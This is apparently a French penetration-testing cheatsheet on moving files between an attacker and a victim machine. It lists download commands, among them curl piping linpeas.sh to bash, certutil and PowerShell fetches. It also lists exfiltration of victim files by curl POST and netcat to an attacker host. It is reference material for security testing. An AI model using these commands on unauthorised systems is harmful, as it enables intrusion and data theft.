---
title: "File Transfer Techniques - All Platforms"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "Cheatsheet: File Transfer Techniques - All Platforms"
summary: "Networking | File Transfer Techniques - All Platforms"
tags:
  - "Networking"
  - "File Transfer"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "Networking"
ShowToc: true
TocOpen: false

cover:
  image: /images/covers/cheatsheet.svg
  alt: "cheatsheet"
  relative: false
---

## Serveur HTTP (attaquant)
```bash
python3 -m http.server 8000
php -S 0.0.0.0:8000
```

## Download (victime)
```bash
# Linux
wget http://<IP>:8000/fichier
curl http://<IP>:8000/fichier -o fichier
curl http://<IP>:8000/linpeas.sh | bash

# Windows
certutil -urlcache -f http://<IP>:8000/fichier fichier
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>:8000/fichier','C:\tmp\fichier')"
powershell IWR -Uri http://<IP>:8000/fichier -OutFile fichier
```

## Upload (victime → attaquant)
```bash
# Attaquant: serveur upload
python3 -m uploadserver 8000

# Victime
curl -X POST http://<IP>:8000/upload -F 'files=@fichier'
```

## Netcat
```bash
# Réception
nc -lvnp 4444 > fichier
# Envoi
nc <IP> 4444 < fichier
```

## SCP
```bash
scp fichier user@<IP>:/tmp/
scp user@<IP>:/tmp/fichier .
```

## Base64 (pas de transfert réseau)
```bash
# Sur victime
base64 fichier | tr -d '\n'
# Sur attaquant
echo '<base64>' | base64 -d > fichier
```
